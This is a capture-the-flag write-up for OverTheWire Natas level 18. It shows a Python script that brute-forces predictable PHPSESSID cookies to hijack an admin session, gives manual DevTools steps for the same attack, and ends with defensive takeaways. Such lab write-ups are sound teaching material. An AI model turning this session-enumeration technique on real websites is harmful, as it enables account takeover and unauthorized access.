# Natas Level 18 — Writeup

**Challenge:** [OverTheWire Natas Wargame](http://natas.labs.overthewire.org/)
**Level:** natas17 → natas18
**Category:** Session ID Brute Forcing / Broken Access Control


## Objective

Find the password for `natas19` by exploiting weak session management on the `natas18` login page.


## Recon

Logging into `natas18` normally lands you on a page that says:

```
You are logged in as a regular user. Only admin can see the password, and that is not you.
```

Viewing the page source / behavior shows that the app uses a `PHPSESSID` cookie to track sessions, and crucially the session determines whether you're treated as a "regular user" or "admin".

The key vulnerability: **the session IDs are not random, cryptographically-generated tokens.** They appear to be small sequential/predictable integers (a classic weak session-ID implementation). This means an attacker doesn't need to steal a session they can simply **guess** valid session IDs until one happens to belong to the admin.


## Approach

Since `PHPSESSID` values are small predictable numbers, the attack is straightforward:

1. Loop through a range of possible `PHPSESSID` values (e.g. `1` to `640`).
2. For each value, send a GET request to the natas18 page with that cookie set manually.
3. Check the response body — if it does **not** contain the "regular user" message, we may have landed on an admin session, which reveals the password directly in the page.

This is essentially brute-forcing session cookies rather than credentials, a form of **broken authentication / insecure session management**.

## Script Used

```python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas18', 'natas18_password')

MAX = 640
count = 1

u = "http://natas18.natas.labs.overthewire.org/index.php?debug"

while count <= MAX:
    sessionID = "PHPSESSID=" + str(count)
    print(sessionID)

    headers = {'Cookie': sessionID}
    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)

    count += 1

print("Done!")
```

### How it works

- `basicAuth` handles the level's HTTP Basic Auth (the "site-wide" natas credentials for level 18).
- For every integer from `1` to `640`, the script manually sets the `PHPSESSID` cookie and requests the page effectively impersonating every possible session.
- Whenever the response text **doesn't** match the standard "regular user" message, the script prints the full response which is where the admin page (containing the `natas19` password) shows up.


## Result

Iterating through session IDs eventually hit one where the server treated the request as an **admin session**, and the response revealed the `natas19` password directly in the page content, no credential guessing required, just cookie/session brute-forcing.


## Manual Verification (Browser Method)

The script does two useful things at once when it finds the correct session:

1. It reveals **which `PHPSESSID` value belongs to the admin session**.
2. Since the request URL already includes `?debug`, the admin page response also directly contains the **`natas19` password** in the printed output.

So technically, once the script finds the working session ID, you don't even need to keep using Python — you can confirm it manually in the browser:

1. Open **DevTools → Application tab → Cookies** (on the natas18 page you're logged into).
2. Find the `PHPSESSID` cookie and **replace its value** with the session ID the script found (the one that returned something other than "You are logged in as a regular user").
3. Refresh the page, it should now load as the **admin session**.
4. Add `?debug` to the URL (e.g. `http://natas18.natas.labs.overthewire.org/index.php?debug`) — this reveals the extra debug output on the page, which includes the `natas19` password directly, the same way it appeared in the script's response.

This confirms the vulnerability isn't just a scripting trick — it's a genuinely broken access control that any attacker could reproduce by hand with nothing more than browser DevTools once they know (or guess) a valid admin session ID.


## Key Takeaways

- **Predictable session identifiers are a critical vulnerability.** If session IDs are sequential or drawn from a small keyspace, an attacker can simply enumerate them instead of stealing or cracking them.
- **Access control should never rely solely on a client-supplied cookie value being "hard to guess."** True security requires unpredictable, high-entropy tokens (e.g. cryptographically random, sufficiently long) plus server-side authorization checks tied to the authenticated identity — not just "whatever session ID happens to be sitting in the session store."
- This is a real-world class of bug (`CWE-330: Use of Insufficiently Random Values`, related to `CWE-384: Session Fixation` risk models) frameworks with weak or custom session ID generators have been exploited this way in production apps.


## Mitigation (Defensive Takeaway)

- Generate session IDs using a **cryptographically secure random number generator** with sufficient length/entropy (PHP's default `session.sid_length` and `session.sid_bits_per_character` settings, when left at secure defaults, already avoid this — the bug here is a custom/weak override).
- Tie sessions to additional server-side validation (IP binding, user-agent checks, short expiry) as defense-in-depth, though this should never be a substitute for strong random session tokens.
- Rate-limit or lock out repeated failed session attempts to make brute-forcing impractical even if IDs were somewhat guessable.


*Writeup for educational purposes as part of the OverTheWire Natas wargame series.*